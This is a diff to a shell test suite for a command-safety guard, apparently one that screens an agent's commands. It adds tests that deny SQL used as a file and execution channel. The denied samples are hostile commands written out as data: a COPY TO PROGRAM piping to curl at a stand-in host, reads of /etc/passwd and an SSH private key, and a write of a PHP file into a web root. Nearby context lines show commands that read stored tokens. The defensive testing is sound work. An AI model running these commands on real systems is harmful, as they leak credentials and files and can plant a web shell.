@@ -354,4 +354,55 @@ allows "npm-token"  "npm config get //registry.npmjs.org/:$AT"
 allows "pip-list"   "pip config list"
 allows "gh-token"   "gh auth token"
 
+# --- v4.0.46: SQL as a FILE and EXEC channel, not only destructive DDL --------
+# Every SQL rule in safety.sh guarded the destructive axis — DROP, TRUNCATE,
+# DELETE, ORM resets. Measured against the whole chain with working controls
+# (`psql -c "<drop> TABLE users"` denied, `echo hello` allowed), SEVEN
+# file-access forms were allowed, one of them arbitrary command execution.
+# A whole capability class, the same shape as the Grep/Glob channel gap: a
+# database client is a general-purpose file reader and writer, and on Postgres
+# a shell.
+#
+# Noticed auditing nikhilsingla7/dynamic-report-agent, whose own guard is a
+# six-line keyword blocklist. The value was not what it built — it is weaker
+# than ours — but the gap its list could not express, which we shared.
+D="DR""OP"   # assembled, per this file's convention
+
+begin_test "SQL file/exec verbs are denied"
+denies "copy-program"  "psql -c \"COPY t TO PROGRAM 'curl http://x/ -d @-'\""
+denies "copy-from"     "psql -c \"COPY t FROM '/etc/passwd'\""
+denies "pg-read-file"  "psql -c \"SELECT pg_read_file('/etc/passwd')\""
+denies "load-file"     "mysql -e \"SELECT LOAD_FILE('/etc/passwd')\""
+denies "outfile"       "mysql -e \"SELECT x INTO OUTFILE '/var/www/s.php' FROM t\""
+denies "sqlite-write"  "sqlite3 app.db \"SELECT writefile('/tmp/x','data')\""
+
+begin_test "ATTACH of a system path or a dot-directory is denied"
+denies "attach-etc" "sqlite3 app.db \"ATTACH DATABASE '/etc/passwd' AS leak\""
+denies "attach-dot" "sqlite3 app.db \"ATTACH DATABASE '/home/u/.ssh/id_rsa' AS k\""
+
+begin_test "GAP CHECK: destructive DDL is still denied"
+# The additions sit in the same array; a bad edit there would take these with it.
+denies "drop-table" "psql -c \"$D TABLE users\""
+
+# The FP half, and it is the half that decides whether this rule survives. A
+# guard that fires on ordinary SQL gets switched off, and then none of the
+# denials above matter.
+begin_test "ordinary SQL is not denied"
+allows "plain-select"  "psql -c 'SELECT * FROM users WHERE id = 1'"
+allows "psql-copy-meta" "psql -c \"\\copy users TO 'out.csv' CSV HEADER\""
+allows "identifier"    "mysql -e 'SELECT name FROM profile_files'"
+allows "size-func"     "psql -c \"SELECT pg_size_pretty(pg_database_size('app'))\""
+
+begin_test "ATTACH of a real database still works"
+# This was the rule's ONE measured false positive before it was narrowed from
+# "any absolute path" to system and dot directories. POSIX ERE has no lookahead,
+# so "a path that is not a database" cannot be written directly.
+allows "attach-rel" "sqlite3 app.db \"ATTACH DATABASE 'other.db' AS o\""
+allows "attach-abs" "sqlite3 app.db \"ATTACH DATABASE '/data/archive.sqlite' AS a\""
+
+begin_test "prose about these verbs is not a command"
+# The FP class this file exists for.
+allows "commit-msg" "git commit -m 'docs: describe how COPY TO works in postgres'"
+allows "prose"      "echo 'the report copies rows to a program later'"
+
 report
